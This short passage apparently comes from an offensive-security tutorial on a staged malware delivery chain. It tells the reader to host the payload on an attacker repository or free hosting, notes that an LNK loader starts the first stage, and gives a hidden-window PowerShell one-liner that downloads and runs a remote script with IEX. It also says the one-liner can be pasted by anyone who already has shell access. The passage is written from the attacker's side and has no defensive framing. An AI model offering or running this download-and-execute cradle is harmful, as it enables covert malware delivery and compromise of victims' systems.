Host this entire path in the attacker's repository. Or you can host them on a free file-hosting site like Heroku or Netlify or your own VPS. 

The LNK loader simply executes the first stage. 
`powershell.exe -WindowStyle Hidden -Command IEX(iwr -UseBasicParsing http://192.168.1.26/script.ps1)`

If you already have shell access, you can simply copy and paste the one-liner to start the chain.
